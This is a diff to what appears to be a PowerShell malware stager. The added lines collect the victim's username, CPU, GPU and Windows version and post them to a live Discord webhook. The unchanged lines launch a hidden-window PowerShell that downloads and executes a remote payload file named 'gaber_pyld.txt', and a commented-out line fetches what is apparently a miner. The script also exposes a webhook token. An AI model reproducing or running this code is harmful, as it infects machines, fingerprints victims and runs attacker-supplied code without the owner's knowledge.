@@ -1,3 +1,42 @@
 sleep 5
+
+
+# Retrieve CPU information
+$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors
+
+# Retrieve GPU information
+$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion
+
+$osVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+
+sleep 2
+
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1276656119212933271/ljgEyB7ad5w4Gj1PTDKiKy_kxL4JW9dGMyOEtbWZENrOfPNvRItMHbgbCoEBh6Sws3Sx"
+
+# Define the message payload
+$payload = @{
+    content = @"
+================================
+**$env:USERNAME** system online
+
+**GPU:** $($gpu.Name)
+**CPU:** $($cpu.Name)
+**CPU Cores:** $($cpu.NumberOfCores)
+**OS:** $osVersion
+================================
+"@
+} | ConvertTo-Json
+
+# Send the POST request to the webhook URL
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    Write-Output "Message sent successfully."
+} catch {
+    Write-Output "Failed to send message. Error: $_"
+}
+sleep 5
+
+
 start powershell -windowstyle h -args 'iex (iwr raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber_pyld.txt -usebasicparsing)'
 #start powershell -windowstyle h -args 'iex (iwr raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber_mnr.txt -usebasicparsing)'
